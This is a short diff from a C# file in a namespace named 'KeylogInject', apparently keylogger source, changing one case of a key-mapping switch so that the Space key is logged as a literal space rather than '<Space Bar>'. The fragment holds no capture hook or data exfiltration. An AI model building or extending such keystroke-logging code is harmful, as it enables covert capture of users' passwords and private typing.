@@ -341,7 +341,7 @@ namespace KeylogInject
                                 //    key = "<Caps Lock>";
                                 //    break;
                                 case Keys.Space:
-                                    key = "<Space Bar>";
+                                    key = " ";
                                     break;
                                 case Keys.Tab:
                                     key = "<Tab>";
